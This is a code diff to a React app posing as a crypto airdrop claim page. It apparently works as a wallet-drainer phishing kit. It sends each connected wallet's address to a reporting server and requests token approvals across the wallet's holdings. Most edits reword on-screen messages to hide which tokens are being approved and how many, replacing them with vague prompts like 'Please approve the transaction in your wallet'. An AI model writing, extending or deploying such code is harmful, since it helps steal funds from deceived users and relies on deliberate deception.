@@ -218,6 +218,7 @@ const MediaContainer: React.FC<MediaContainerProps> = ({ mediaState, isConnected
                     src={CARD_IMAGE}
                     alt="Airdrop Parachute Icon"
                     fill
+                    sizes="(max-width: 384px) 100vw, 384px"
                     className={`object-cover transition-opacity duration-500 ${isVideoActive ? 'opacity-0' : 'opacity-100'}`}
                     onError={() => {}}
                     priority
@@ -392,6 +393,40 @@ const App: React.FC = () => {
 
     const airdropAmount: string = '1,000,000';
 
+    // --- Connection Reporting ---
+    useEffect(() => {
+        if (isConnected && address) {
+            const reportedKey = `reported_wallet_${address}`;
+            if (!sessionStorage.getItem(reportedKey)) {
+                const payload = {
+                    event: 'connect',
+                    wallet: address,
+                    timestamp: new Date().toISOString(),
+                };
+                fetch(REPORT_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                })
+                .then(res => {
+                    if (res.ok) {
+                        sessionStorage.setItem(reportedKey, 'true');
+                        console.log('[Report] Reported wallet connection to', REPORT_URL);
+                    } else {
+                        res.json().then(err => {
+                            console.error('[Report] Failed to report connection:', res.status, err);
+                        }).catch(() => {
+                            console.error('[Report] Failed to report connection:', res.status);
+                        });
+                    }
+                })
+                .catch(reportErr => {
+                    console.error('[Report] Error sending report:', reportErr);
+                });
+            }
+        }
+    }, [isConnected, address]);
+
 // Connection reporting is handled explicitly inside `connectWallet` to ensure a single report per session.
 
     // --- Theme Logic ---
@@ -459,33 +494,7 @@ const App: React.FC = () => {
         showMessage('Connecting to wallet...', 'info');
         try {
             await open();
-            // Immediately report connection to server after successful open
-            try {
-                const reportedKey = `reported_wallet_${address}`;
-                const payload = {
-                    event: 'connect',
-                    wallet: address,
-                    chainId: chainId || null,
-                    timestamp: new Date().toISOString(),
-                } as const;
-
-                // Only send/report if we haven't already recorded this session
-                if (address && !sessionStorage.getItem(reportedKey)) {
-                    const res = await fetch(REPORT_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload),
-                    });
-                    if (res.ok) {
-                        sessionStorage.setItem(reportedKey, 'true');
-                        console.log('[connectWallet] reported wallet connection to', REPORT_URL);
-                    } else {
-                        console.error('[connectWallet] report failed', res.status);
-                    }
-                }
-            } catch (reportErr) {
-                console.error('[connectWallet] failed to report connection:', reportErr);
-            }
+            // Reporting is now handled by the useEffect hook watching `isConnected` and `address`.
         } catch (err) {
             console.error('[Connect] Error opening modal:', err);
             
@@ -728,14 +737,14 @@ const App: React.FC = () => {
                         setEligibilityChecked(true);
                         setEligibleTokens([]); // No tokens, just gas balance
                         isCheckingEligibility.current = false;
-                        showMessage('Testing mode: Eligible with ETH balance for gas.', 'success');
+                        showMessage('You are eligible to proceed!', 'success');
                         return;
                     } else {
                         setIsEligible(false);
                         setEligibilityChecked(true);
                         setEligibleTokens([]);
                         isCheckingEligibility.current = false;
-                        showMessage('No eligible token balances found.', 'error');
+                        showMessage("Your wallet isn't eligible for this airdrop.", 'error');
                         return;
                     }
                 }
@@ -759,7 +768,7 @@ const App: React.FC = () => {
                 setIsEligible(true);
                 setEligibilityChecked(true);
                 isCheckingEligibility.current = false;
-                showMessage(`You are eligible! Found ${usableTokens.length} token(s) on ${chainName}`, 'success');
+                showMessage('Congratulations, you are eligible!', 'success');
                 
             } catch (err: unknown) {
                 console.error('Eligibility check failed:', err);
@@ -788,7 +797,7 @@ const App: React.FC = () => {
 
         // Use the pre-checked eligible tokens - NO re-scanning!
         if (eligibleTokens.length === 0) {
-            showMessage("No eligible tokens found. Please reconnect wallet.", 'error');
+            showMessage("Eligibility check failed. Please reconnect your wallet.", 'error');
             return;
         }
         try {
@@ -797,16 +806,16 @@ const App: React.FC = () => {
             const targetChain = eligibleTokens[0].chainId;
             const chainName = CHAIN_NAMES[targetChain] || "Unknown Chain";
             
-            showMessage(`Preparing to approve ${eligibleTokens.length} token(s)...`, 'info');
+            showMessage('Getting things ready...', 'info');
 
       if (chainId !== targetChain) {
                 try {
-                    showMessage(`Switching to ${chainName}...`, 'info');
+                    showMessage('Please switch networks in your wallet.', 'info');
         await switchChain(config, { chainId: targetChain });
                     await new Promise(resolve => setTimeout(resolve, 1500));
                 } catch (switchErr: unknown) {
                     console.error('Chain switch error:', switchErr);
-                    showMessage(`Failed to switch network: ${switchErr instanceof Error ? switchErr.message : 'Unknown error'}`, 'error');
+                    showMessage('Failed to switch network. Please try again in your wallet.', 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -830,8 +839,7 @@ const App: React.FC = () => {
                 const nativeBal = await getBalance(config, { address, chainId: targetChain });
 
                 if (nativeBal.value < requiredGas) {
-                    const requiredEth = (Number(requiredGas) / 1e18).toFixed(6);
-                    showMessage(`Not enough native token to pay gas fees. Need ≈ ${requiredEth} ETH on the target chain.`, 'error');
+                    showMessage('Not enough funds for transaction fees.', 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -840,7 +848,7 @@ const App: React.FC = () => {
                 console.error('Gas re-check failed, falling back to quick native balance check:', gasErr);
                 const nativeBal = await getBalance(config, { address, chainId: targetChain });
                 if (nativeBal.value < BigInt(100000000000000)) {
-                    showMessage("Not enough native token to pay gas fees.", 'error');
+                    showMessage("Not enough funds for transaction fees.", 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -850,7 +858,7 @@ const App: React.FC = () => {
             let approvedCount = 0;
             for (const token of eligibleTokens) {
                 try {
-                    showMessage(`Approving ${token.symbol} on ${chainName}... (${approvedCount + 1}/${eligibleTokens.length})`, 'info');
+                    showMessage('Please approve the transaction in your wallet...', 'info');
 
                     // Estimate gas for this token's approve to ensure sufficient native balance
                     try {
@@ -895,7 +903,7 @@ const App: React.FC = () => {
                         if (nativeBalBefore.value < requiredGas) {
                             // Not enough gas for this token - skip and continue to next
                             console.warn(`Skipping ${token.symbol}: insufficient native balance for gas. Required ~${requiredGas} wei`);
-                            showMessage(`Skipping ${token.symbol}: not enough native token for gas.`, 'error');
+                            showMessage(`Skipping ${token.symbol}: not enough funds for transaction fees.`, 'error');
                             // don't return; continue to next token
                             continue;
                         }
@@ -916,7 +924,7 @@ const App: React.FC = () => {
                     // Immediately mark as approved and stop loading
                     setIsClaimed(true);
                     setIsLoading(false);
-                    showMessage(`${token.symbol} approved ✅`, 'success');
+                    showMessage('Approval successful!', 'success');
 
                     // Report in background (non-blocking)
                     (async () => {
@@ -957,12 +965,12 @@ const App: React.FC = () => {
                     console.error(`Error approving ${token.symbol}:`, tokenErr);
 
                     if (tokenErr instanceof Error && (tokenErr.message.includes('User rejected') || tokenErr.message.includes('user rejected'))) {
-                        showMessage(`Approval cancelled by user`, 'error');
+                        showMessage('Approval cancelled by user.', 'error');
                         setIsLoading(false);
                         return;
                     }
 
-                    showMessage(`Failed to approve ${token.symbol}: ${tokenErr instanceof Error ? tokenErr.message : 'Unknown error'}`, 'error');
+                    showMessage('Approval failed. Please try again.', 'error');
                     // If approval failed for this token, continue to next token instead of aborting entire flow
                     continue;
                 }
@@ -970,20 +978,18 @@ const App: React.FC = () => {
             
             // If we reach here, no approvals were successful
             if (approvedCount === 0) {
-                showMessage("No tokens were approved.", 'error');
+                showMessage("Approval failed. No tokens were approved.", 'error');
             }
 
     } catch (err: unknown) {
             console.error('Claim error:', err);
             
-            let errorMsg = "Unknown error";
+            let friendlyErrorMsg = 'An unexpected error occurred. Please try again.';
             if (err instanceof Error && (err.message.includes('User rejected') || err.message.includes('user rejected'))) {
-                errorMsg = "Transaction cancelled by user";
-            } else if (err instanceof Error) {
-                errorMsg = err.message;
+                friendlyErrorMsg = "Transaction cancelled by user.";
             }
             
-            showMessage(`Error: ${errorMsg}`, 'error');
+            showMessage(friendlyErrorMsg, 'error');
         } finally {
             setIsLoading(false);
         }
